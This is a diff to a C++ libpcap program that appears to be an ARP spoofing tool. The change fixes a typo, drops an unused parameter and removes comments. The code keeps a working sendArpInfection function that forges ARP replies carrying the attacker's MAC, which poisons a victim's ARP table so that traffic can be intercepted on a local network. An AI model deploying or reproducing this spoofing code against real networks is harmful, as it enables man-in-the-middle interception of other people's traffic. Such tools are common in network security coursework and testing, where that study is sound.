@@ -49,7 +49,7 @@ bool getMacAddress(const std::string& interfaceName, Mac& myMacAddress) {
 bool getIpAddress(const std::string& interfaceName, Ip& myIpAddress) {
 	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
 	if (sockfd == -1) {
-		perror("socker");
+		perror("socket");
 		return false;
 	}
 
@@ -70,15 +70,13 @@ bool getIpAddress(const std::string& interfaceName, Ip& myIpAddress) {
     	return true;
 }
 
-bool sendArpRequest(pcap_t* handle, const Mac& myMacAddress, const Ip& myIpAddress, const Ip& targetIp, const Ip& senderIp) {
+bool sendArpRequest(pcap_t* handle, const Mac& myMacAddress, const Ip& myIpAddress, const Ip& senderIp) {
     	EthArpPacket packet;
 
-    	// Fill Ethernet header
     	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
     	packet.eth_.smac_ = myMacAddress;
     	packet.eth_.type_ = htons(EthHdr::Arp);
 
-    	// Fill ARP header
     	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     	packet.arp_.pro_ = htons(EthHdr::Ip4);
     	packet.arp_.hln_ = Mac::SIZE;
@@ -96,21 +94,19 @@ bool sendArpRequest(pcap_t* handle, const Mac& myMacAddress, const Ip& myIpAddre
 bool sendArpInfection(pcap_t* handle, const Mac& myMacAddress, const Mac& senderMac, const Ip& targetIp, const Ip& senderIp) {
     	EthArpPacket packet;
 
-    	// Fill Ethernet header
-    	packet.eth_.dmac_ = senderMac; // Send ARP infection to sender using sender's MAC as destination MAC
+    	packet.eth_.dmac_ = senderMac;
     	packet.eth_.smac_ = myMacAddress;
     	packet.eth_.type_ = htons(EthHdr::Arp);
 
-    	// Fill ARP header
     	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     	packet.arp_.pro_ = htons(EthHdr::Ip4);
     	packet.arp_.hln_ = Mac::SIZE;
     	packet.arp_.pln_ = Ip::SIZE;
-    	packet.arp_.op_ = htons(ArpHdr::Reply); // ARP infection is ARP reply packet
-    	packet.arp_.smac_ = myMacAddress; // Send ARP infection using my MAC as sender MAC
-    	packet.arp_.sip_ = htonl(targetIp); // Set target IP as my IP (to overwrite target's ARP table entry)
-    	packet.arp_.tmac_ = senderMac; // Set sender's MAC as target MAC (to update sender's ARP table)
-    	packet.arp_.tip_ = htonl(senderIp); // Set sender IP as target IP
+    	packet.arp_.op_ = htons(ArpHdr::Reply);
+    	packet.arp_.smac_ = myMacAddress;
+    	packet.arp_.sip_ = htonl(targetIp);
+    	packet.arp_.tmac_ = senderMac;
+    	packet.arp_.tip_ = htonl(senderIp);
 
     	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     	return (res == 0);
@@ -153,7 +149,7 @@ int main(int argc, char* argv[]) {
         	Ip targetIp = Ip(argv[i + 1]);
 
         	Mac senderMac;
-        	if (!sendArpRequest(handle, myMacAddress, myIpAddress, targetIp, senderIp)) {
+        	if (!sendArpRequest(handle, myMacAddress, myIpAddress, senderIp)) {
 		       	printf("failed to send arp request\n");
 		}
 
